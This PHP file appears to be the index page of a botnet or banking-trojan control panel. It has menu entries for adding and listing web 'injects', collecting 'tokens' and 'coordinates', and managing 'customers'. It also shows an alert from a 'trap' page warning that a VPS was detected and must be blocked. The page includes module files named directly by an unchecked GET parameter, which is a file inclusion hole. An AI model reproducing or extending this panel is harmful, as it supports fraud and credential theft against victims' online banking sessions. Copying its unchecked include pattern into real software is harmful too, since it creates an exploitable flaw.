<?php

// records from www/clients/trap/index.php
if(file_exists('vps_fucked'))
{
	$data = file_get_contents('vps_fucked');
	if(trim($data) != '')
		echo "<textarea rows='10' cols='100'>VPS fucked! Block them fast! Details:\n{$data}</textarea>";
}

############ CHECK BACKEND SETTINGS 

if(!function_exists('curl_init'))
	echo "<h4 style='color: darkred'>&#151; curl extension is not installed! <input type='text' size='50' onclick='this.select()' value='apt-get install php5-curl && apachectl restart' /></h4>";

if(strstr(file_get_contents('/var/data/sites-enabled/rpaf.conf'), 'FRONTEND_IP'))
	echo "<h4 style='color: darkred'>&#151; FRONTEND_IP did not set in sites-enabled/rpaf.conf!</h4>";
	
if(!strstr(file_get_contents('/var/data/sites-enabled/bot.conf'), '#	php_admin_value error_reporting "7"'))
	echo "<h4 style='color: darkred'>&#151; Debug mode enabled in sites-enabled/bot.conf!</h4>";

if(ini_get('post_max_size') != '100M' || ini_get('upload_max_filesize') != '100M')
{
	$p1 = ini_get('post_max_size');
	$p2 = ini_get('upload_max_filesize');
	$p3 = ini_get('memory_limit');
	echo "<h4 style='color: darkred'>&#151; post_max_size = {$p1}<br />
&#151; upload_max_filesize = {$p2}<br />
&#151; memory_limit = {$p3}
	</h4>";
}

if(!file_exists('/usr/lib/libc++.so'))
	echo "<h4 style='color: darkred'>&#151; /usr/lib/libc++.so not installed</h4>";

########## WORK
	
$action = (isset($_GET['action']))? $_GET['action'] : 'customers';

$items = array(
	"add_customer"=>["medical", "Add customer"],
	"delim1"=>"delim",
	"customers"=>["dash", "Customers"],
	//~ "injects"=>["tb", "Injects"],
	"backups"=>["anlt", "Backups"],
	"injects_list"=>["typ", "Injects list"],
	"delim2"=>"delim",
	"add_injects"=>["icn", "Add injects"],
	//"ip_block"=>["cal", "IP blocked"],
	"tokens"=>["tag", "Tokens"],
	"coordinates"=>["target", "Coodrinates"],
	
);
$menu = "";
foreach($items as $key=>$val)
{
	if($val == 'delim')
	{
		$menu .= "<li class='nav-item'><div style='border: 1px solid #666; height: 100%'></div></li>";
		continue;
	}
	
	$active = ($key == $action)? "-active" : "";
	$menu .= "<li class='nav-item'><a href='index.php?action={$key}'><img src='img/nav/{$val[0]}{$active}.png' alt='' /><p>{$val[1]}</p></a></li>\n";
}

$header = file_get_contents('tpls/header.html');
$header = str_replace('%MENU%', $menu, $header);
echo $header;

include("mods/{$action}.php");

echo file_get_contents('tpls/footer.html');
